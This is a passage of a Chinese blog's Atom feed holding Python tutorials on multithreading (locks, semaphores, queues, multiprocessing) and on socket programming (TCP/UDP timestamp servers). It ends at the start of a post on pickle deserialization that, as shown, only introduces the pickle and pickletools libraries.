      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python-多线程编程</title>
    <link href="https://www.extrader.top/posts/64be7bf2/"/>
    <id>https://www.extrader.top/posts/64be7bf2/</id>
    <published>2020-04-10T10:01:26.000Z</published>
    <updated>2020-04-10T10:01:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p><table><thead><tr><th align="center">对象</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">表示一个执行线程的对象</td></tr><tr><td align="center">Lock</td><td align="center">锁原语对象</td></tr><tr><td align="center">RLock</td><td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td></tr><tr><td align="center">Condition</td><td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td></tr><tr><td align="center">Event</td><td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td></tr><tr><td align="center">Semaphore</td><td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Timer</td><td align="center">与Thread相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Barrier</td><td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td></tr></tbody></table><h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p><p><strong>Thread对象数据属性</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">线程名</td></tr><tr><td align="center">ident</td><td align="center">线程的标识符</td></tr><tr><td align="center">daemon</td><td align="center">布尔标志，表示这个线程是否是守护线程</td></tr></tbody></table><p><strong>Thread对象方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs=&#123;&#125;,verbose=None,daemon=None)</code></td><td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td></tr><tr><td align="center">start()</td><td align="center">开始执行该线程</td></tr><tr><td align="center">run()</td><td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td></tr></tbody></table><p>下面看一段可创建多线程的代码</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import sleep, ctimeloops &#x3D; [4, 2]def loop(nloop, nsec):    print(&quot;start loop&quot;, nloop, &quot;at :&quot;, ctime())    sleep(nsec)    print(&quot;loop&quot;, nloop, &quot;done at :&quot;, ctime())def main():    print(&quot;starting at:&quot;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; threading.Thread(target&#x3D;loop, args&#x3D;(i,loops[i]))  #target&#x3D;需要线程去执行的方法名   args&#x3D;线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号        threads.append(t)    for i in nloops:        print(threads[i])        threads[i].start() #线程等待启动    for i in nloops:        threads[i].join()  # 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭        print(threads[i])    print(&quot;all DONE at:&quot;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt loading="lazy"></p><p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctime, sleeploops &#x3D; [4, 2]class ThreadFunc(threading.Thread):    def __init__(self, func, args):        threading.Thread.__init__(self)        self.func &#x3D; func        self.args &#x3D; args    def run(self):          #重写run方法,定义线程功能        self.func(*self.args)def loop(nloop, nsec):    print(&#39;start loop&#39;, nloop, &#39;at :&#39;, ctime())    sleep(nsec)    print(&#39;loop&#39;, nloop, &#39;done at :&#39;, ctime())def main():    print(&#39;starting at :&#39;, ctime())    threads &#x3D; []    nloops &#x3D; range(len(loops))    for i in nloops:        t &#x3D; ThreadFunc(loop, (i, loops[i]))        threads.append(t)    for i in nloops:        threads[i].start()    for i in nloops:        threads[i].join()    print(&#39;all DONE at :&#39;,ctime())if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p><pre class="language-python" data-language="python"><code class="language-python">import threadingfrom time import ctimeclass MyThread(threading.Thread):    def __init__(self,func,args,name &#x3D; &quot;&quot;):        self.name &#x3D; name        self.func &#x3D; func        self.args &#x3D; args    def getResult(self):        return self.res  #将结果保存后通过getResult方法获取返回值    def run(self):        print(&quot;starting&quot;, self.name, ctime())        self.res &#x3D; self.func(*self.args)        print(self.name, &quot;finished at :&quot;, ctime())</code></pre><h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><pre class="language-python" data-language="python"><code class="language-python">from myThread import MyThreadfrom time import ctime, sleepdef Fib(x):    sleep(0.005)    if x &lt; 3: return 1    return (Fib(x - 1) + Fib(x - 2))def Fac(x):    sleep(0.1)    if x &lt; 2: return 1    return (x * Fac(x - 1))def Sum(x):    sleep(0.1)    if x &lt; 2: return 1    return (x + Sum(x - 1))funcs &#x3D; [Fib, Fac, Sum]n &#x3D; 8def main():    nfuncs &#x3D; range(len(funcs))    for i in nfuncs:        print(&quot;starting&quot;, funcs[i].__name__, &quot;at :&quot;, ctime())        print(funcs[i](n))        print(funcs[i].__name__, &quot;finished at :&quot;, ctime())    print(&quot;\n *** MULTIPLE THREADS&quot;)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (n,), funcs[i].__name__)        threads.append(t)    for i in nfuncs:        threads[i].start()    for i in nfuncs:        threads[i].join()        print(threads[i].getResult())    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>运行结果如下，可见多线程处理的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt loading="lazy"></p><h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import Thread , Lock, current_threadfrom time import ctime, sleepclass CleanOutputSet(set):    def __str__(self):  #当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据        return &quot;, &quot;.join(x for x in self)#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回lock &#x3D; Lock()   #创建一个锁对象loops &#x3D; (randrange(2,5) for x in range(randrange(3,7)))#此行表示随机选取2-5的数字随机选3-7次remaining &#x3D; CleanOutputSet()def loop(nsec):    myname &#x3D; current_thread().name  #返回当前Thread对象的名字    lock.acquire()          #加锁    remaining.add(myname)   #add方法，如果不在集合中则添加    print(&quot;[&#123;&#125;] Started &#123;&#125;&quot;.format(ctime(),myname))    #print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()          #释放    sleep(nsec)    lock.acquire()    remaining.remove(myname)    print(&quot;[&#123;&#125;] Competed &#123;&#125; (&#123;&#125; secs)&quot;.format(ctime(),myname,nsec))    print(&quot;    (remaining: &#123;&#125;)&quot;.format(remaining or &quot;NONE&quot;))    lock.release()def main():    for pause in loops:        Thread(target&#x3D;loop, args&#x3D;(pause,)).start()@register   #通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行def _atexit():     print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt loading="lazy"></p><p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p><h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><pre class="language-python" data-language="python"><code class="language-python">from atexit import registerfrom random import randrangefrom threading import BoundedSemaphore, Lock, Threadfrom time import ctime, sleeplock &#x3D; Lock()MAX &#x3D; 5candytray &#x3D; BoundedSemaphore(MAX)def refill():    lock.acquire()    print(&quot;Refilling candy...&quot;,end&#x3D;&quot;&quot;)    try:        candytray.release()  #释放信号量，使内部计数器增加一，可以唤醒等待的线程    except ValueError:        print(&quot;full, skipping&quot;)    else:        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    lock.release()def buy():    lock.acquire()    print(&quot;Buying candy...&quot;,end&#x3D;&quot;&quot;)    if candytray.acquire(False):   # 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False        print(&quot;OK  &quot;,end&#x3D;&quot;&quot;)        print(&quot;Remaining :&#123;&#125;&quot;.format(candytray._value))    else:        print(&quot;empty, skipping&quot;)    lock.release()def producer(loops):    for i in range(loops):        refill()        sleep(randrange(3))def consumer(loops):    for i in range(loops):        buy()        sleep(randrange(3))def main():    print(&quot;starting at :&#123;&#125;&quot;.format(ctime()))    nloops &#x3D; randrange(2,6)    print(&quot;THE CANDY MACHINE (full with &#123;&#125;)!&quot;.format(MAX))    Thread(target&#x3D;consumer, args&#x3D;(randrange(nloops, nloops + MAX + 2),)).start()    Thread(target&#x3D;producer, args&#x3D;(nloops,)).start()@registerdef _atexit():    print(&quot;all DONE at :&#123;&#125;&quot;.format(ctime()))if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p><code>acquire(blocking=布尔值,timeout=None)</code></p><ul><li>本方法用于获得Semaphore</li><li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li><li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li><li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li></ul><p><code>release()</code></p><ul><li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li></ul><p>结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt loading="lazy"></p><h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p><p><strong>类</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr></tbody></table><p><strong>异常</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">当对空队列调用get*()方法时抛出异常</td></tr><tr><td align="center">Full</td><td align="center">当对已满的队列调用put*()方法时抛出异常</td></tr></tbody></table><p><strong>方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td></tr><tr><td align="center">empty()</td><td align="center">如果队列为空，则返回True，否则返回False</td></tr><tr><td align="center">full()</td><td align="center">如果队列已满，则返回True，否则返回False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">和put(item,Flase)相同</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td></tr><tr><td align="center">get_nowait()</td><td align="center">和get(False)相同</td></tr><tr><td align="center">task_done()</td><td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td></tr><tr><td align="center">join()</td><td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td></tr></tbody></table><pre class="language-python" data-language="python"><code class="language-python">from time import sleepfrom queue import Queuefrom myThread import MyThreaddef writeQ(queue):    queue.put(&quot;xxx&quot;,1)    print(&quot;producing object for Q... &quot;,end&#x3D;&quot;&quot;)    print(&quot;size now &quot;,queue.qsize())def randQ(queue):    val &#x3D; queue.get()    print(&quot;consumed object from Q... size now &quot;, queue.qsize())def writer(queue, loops):   #写数据入队列    for i in range(loops):        writeQ(queue)def reader(queue, loops):   #从队列中取出数据    for i in range(loops):        randQ(queue)        sleep(2)            #添加延时便于观察funcs &#x3D; [reader, writer]nfuncs &#x3D; range(len(funcs))def main():    nloops &#x3D; 5    q &#x3D; Queue(32)    threads &#x3D; []    for i in nfuncs:        t &#x3D; MyThread(funcs[i], (q, nloops), funcs[i].__name__)        threads.append(t)    for i in nfuncs:        threads[i].start()    for i in nfuncs:        threads[i].join()    print(&quot;all DONE&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    main()</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt loading="lazy"></p><h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing">multiprocessing</a> — 基于进程的并行</p><pre class="language-python" data-language="python"><code class="language-python">from multiprocessing import Process, JoinableQueueimport timeimport randomdef consumer(q, name):    while True:        res &#x3D; q.get()  #从对列中取出并返回对象        time.sleep(random.randint(1, 3))        print(&#39;%s 吃掉了 %s&#39; % (name, res))        q.task_done()  #发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕def producer(q, name, food):    time.sleep(random.randint(1, 3))    res &#x3D; &#39;%s&#39; % (food)    q.put(res)  #将res放入队列    print(&#39;%s 生产了 %s&#39; % (name, res))    q.join()    # 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    q &#x3D; JoinableQueue()     # 使用JoinableQueue()    foods &#x3D; [&quot;包子&quot;,&quot;豆浆&quot;,&quot;油条&quot;,&quot;稀饭&quot;]    producerthreads &#x3D; []    consumerthreads &#x3D; []    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;producer, args&#x3D;(q, &#39;厨师&#39;, foods[i]))        producerthreads.append(t)        producerthreads[-1].start()    for i in range(len(foods)):        t &#x3D; Process(target&#x3D;consumer, args&#x3D;(q, &#39;吃货&#39;))        consumerthreads.append(t)        consumerthreads[-1].daemon &#x3D; True        consumerthreads[-1].start()    for i in range(len(producerthreads)):        producerthreads[i].join()    # 1、主进程等生产者p1,p2,p3结束    # 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束    # 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程    print(&quot;END&quot;)</code></pre><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;threading模块&quot;&gt;&lt;a href=&quot;#threading模块&quot; class=&quot;headerlink&quot; title=&quot;threading模块&quot;&gt;&lt;/a&gt;threading模块&lt;/h3&gt;&lt;p&gt;可用对象列表&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;t
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-网络编程</title>
    <link href="https://www.extrader.top/posts/c0f9c454/"/>
    <id>https://www.extrader.top/posts/c0f9c454/</id>
    <published>2020-04-08T04:03:06.000Z</published>
    <updated>2020-04-08T04:03:06.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="scoket模块"><a href="#scoket模块" class="headerlink" title="scoket模块"></a>scoket模块</h3><p>需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用<code>socket.scoket()</code>函数，它的一般语法如下：</p><pre class="language-python" data-language="python"><code class="language-python">socket(scoket_family,scoket_type,protocol&#x3D;0)</code></pre><p><code>scoket_family</code>可以是<code>AF_UNIX</code>或<code>AF_INET(6)</code></p><ul><li><strong>AF_UNIX</strong>：UNIX，用于单一的<code>UNIX</code>系统进程之间的通信</li><li><strong>AF_INET(6)</strong>：因特网，IPv4或IPv6</li></ul><p><code>scoket_type</code>可以是<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></p><ul><li><strong>SOCK_STREAM</strong>：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)</li><li><strong>SOCK_DGRAM</strong>：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol</li></ul><p><code>protocol</code>参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略</p><a id="more"></a><p>创建<code>TCP/IP</code>套接字</p><pre class="language-python" data-language="python"><code class="language-python">tcpSock &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</code></pre><p>创建<code>UPD/IP</code>套接字</p><pre class="language-python" data-language="python"><code class="language-python">udpSock &#x3D; socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</code></pre><p>服务器套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.bind()</td><td align="center">将地址(主机名字),绑定到套接字上，参数需要为元祖格式</td></tr><tr><td align="center">s.listen()</td><td align="center">设置并启动TCP监听器，参数为最大挂起连接数</td></tr><tr><td align="center">s.accept()</td><td align="center">被动接受TCP客户端连接，一直等待到连接到达(阻塞)</td></tr></tbody></table><p>客户端套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.connect()</td><td align="center">主动发起TCP服务器连接</td></tr><tr><td align="center">s.connect_ex()</td><td align="center">connect的扩展版本，会以错误码形式返回问题，而不是抛出一个异常</td></tr></tbody></table><p>普通套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.recv()</td><td align="center">接受TCP消息</td></tr><tr><td align="center">s.send()</td><td align="center">发送TCP消息</td></tr><tr><td align="center">s.sendall</td><td align="center">完整的发送TCP消息</td></tr><tr><td align="center">s.recvfrom()</td><td align="center">接收UDP消息</td></tr><tr><td align="center">s.sendto()</td><td align="center">发送UDP消息</td></tr><tr><td align="center">s.shutdown()</td><td align="center">关闭连接</td></tr><tr><td align="center">s.close()</td><td align="center">关闭套接字</td></tr></tbody></table><h3 id="TCP时间戳服务器"><a href="#TCP时间戳服务器" class="headerlink" title="TCP时间戳服务器"></a>TCP时间戳服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)tcpSerSock &#x3D; socket(AF_INET,SOCK_STREAM)tcpSerSock.bind(ADDR)tcpSerSock.listen(5)while(True):    print(&quot;Waiting for connection...&quot;)    tcpCliSock, addr &#x3D; tcpSerSock.accept()    print(&quot;...connected from:&#123;&#125;&quot;.format(addr))    while(True):        data &#x3D; tcpCliSock.recv(BUFSIZ)        if not data:            break        tcpCliSock.send(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),data.decode()).encode())    tcpCliSock.close()tcpSerSock.close()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)tcpCliSock &#x3D; socket(AF_INET,SOCK_STREAM)tcpCliSock.connect(ADDR)while(True):    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    tcpCliSock.send(data.encode())    data &#x3D; tcpCliSock.recv(BUFSIZ)    if not data:        break    print(data.decode())tcpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt loading="lazy"></p><h3 id="UDP时间戳服务器"><a href="#UDP时间戳服务器" class="headerlink" title="UDP时间戳服务器"></a>UDP时间戳服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)udpSerSock &#x3D; socket(AF_INET,SOCK_DGRAM)udpSerSock.bind(ADDR)while(True):    print(&quot;Waiting for message...&quot;)    data, addr &#x3D; udpSerSock.recvfrom(BUFSIZ)    udpSerSock.sendto(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),data.decode()).encode(),addr)    print(&quot;...received from and returned to :&#123;&#125;&quot;.format(addr))udpSerSock.close()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *HOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)udpCliSock &#x3D; socket(AF_INET,SOCK_DGRAM)while(True):    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    udpCliSock.sendto(data.encode(),ADDR)    data, ADDR &#x3D; udpCliSock.recvfrom(BUFSIZ)    if not data:        break    print(data.decode())udpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt loading="lazy"></p><h3 id="scoketserver模块"><a href="#scoketserver模块" class="headerlink" title="scoketserver模块"></a>scoketserver模块</h3><p><code>socketserver</code>是标准库中的一个高级别的模块。用于简化实现网络客户端与服务器所需要的大量样板代码。模块中已经实现了一些可以使用的类</p><table><thead><tr><th align="center">类</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BaseServer</td><td align="center">包含核心服务器功能和mix-in的钩子，仅用于推导，不创建类的实例</td></tr><tr><td align="center">TCPServer/UDPServer</td><td align="center">基础的网络同步TCP/UDP服务器</td></tr><tr><td align="center">UnixStreamServer/UnixDatagramServer</td><td align="center">基于文件的基础同步TCP/UDP服务器</td></tr><tr><td align="center">BaseRequestHandler</td><td align="center">包含处理服务器请求的核心功能，仅用于推导，不创建类的实例</td></tr><tr><td align="center">StreamRequestHandler/DatagramRequestHandler</td><td align="center">实现TCP/UDP服务器的服务处理器</td></tr></tbody></table><h3 id="scoketserver-TCP-服务器"><a href="#scoketserver-TCP-服务器" class="headerlink" title="scoketserver TCP 服务器"></a>scoketserver TCP 服务器</h3><p>服务器</p><pre class="language-python" data-language="python"><code class="language-python">from socketserver import (TCPServer as TCP, StreamRequestHandler as SRH)from time import ctimeHOST &#x3D; &quot;0.0.0.0&quot;PORT &#x3D; 22222ADDR &#x3D; (HOST,PORT)class MyRequestHandler(SRH):    def handle(self):        print(&quot;...conneceted from :&#123;&#125;&quot;.format(self.client_address))        self.wfile.write(&quot;[&#123;&#125;] &#123;&#125;&quot;.format(ctime(),self.rfile.readline().decode()).encode())tcpServ &#x3D; TCP(ADDR,MyRequestHandler)print(&quot;waiting for connection...&quot;)tcpServ.serve_forever()</code></pre><p>客户端</p><pre class="language-python" data-language="python"><code class="language-python">from socket import *HOST &#x3D; &quot;192.168.0.102&quot;PORT &#x3D; 22222BUFSIZ &#x3D; 1024ADDR &#x3D; (HOST,PORT)while(True):    tcpCliSock &#x3D; socket(AF_INET,SOCK_STREAM)    tcpCliSock.connect(ADDR)    data &#x3D; input(&#39;&gt; &#39;)    if not data:        break    tcpCliSock.send(&quot;&#123;&#125;\r\n&quot;.format(data).encode())    data &#x3D; tcpCliSock.recv(BUFSIZ)    if not data:        break    print(data.decode().strip())    tcpCliSock.close()</code></pre><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;scoket模块&quot;&gt;&lt;a href=&quot;#scoket模块&quot; class=&quot;headerlink&quot; title=&quot;scoket模块&quot;&gt;&lt;/a&gt;scoket模块&lt;/h3&gt;&lt;p&gt;需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用&lt;code&gt;socket.scoket()&lt;/code&gt;函数，它的一般语法如下：&lt;/p&gt;
&lt;pre class=&quot;language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;socket(scoket_family,scoket_type,protocol&amp;#x3D;0)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;scoket_family&lt;/code&gt;可以是&lt;code&gt;AF_UNIX&lt;/code&gt;或&lt;code&gt;AF_INET(6)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AF_UNIX&lt;/strong&gt;：UNIX，用于单一的&lt;code&gt;UNIX&lt;/code&gt;系统进程之间的通信&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AF_INET(6)&lt;/strong&gt;：因特网，IPv4或IPv6&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;scoket_type&lt;/code&gt;可以是&lt;code&gt;SOCK_STREAM&lt;/code&gt;或&lt;code&gt;SOCK_DGRAM&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SOCK_STREAM&lt;/strong&gt;：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SOCK_DGRAM&lt;/strong&gt;：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;protocol&lt;/code&gt;参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化漏洞浅析</title>
    <link href="https://www.extrader.top/posts/488d0f65/"/>
    <id>https://www.extrader.top/posts/488d0f65/</id>
    <published>2020-04-05T10:59:03.000Z</published>
    <updated>2020-04-05T10:59:03.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt loading="lazy"></p><p>以上例子简单的示范了python进行序列化和反序列化的操作</p><a id="more"></a><h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p><ul><li>反汇编一个已经被打包的字符串   <code>pickletools.dis</code></li><li>优化一个已经被打包的字符串       <code>pickletools.optimize</code></li><li>返回一个迭代器来供程序使用       <code>pickletools.genops</code></li></ul><p>一般我们使用前两个功能，可以先看一下效果：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python反序列化漏洞浅析/image-20200405205451074.png" style="zoom:80%;" loading="lazy"><p>这就是反汇编的功能，解析那个字符串，然后告诉你这个字符串干了什么，每一行都是一条指令</p><p>序列化结构示意图（转）</p><p><img 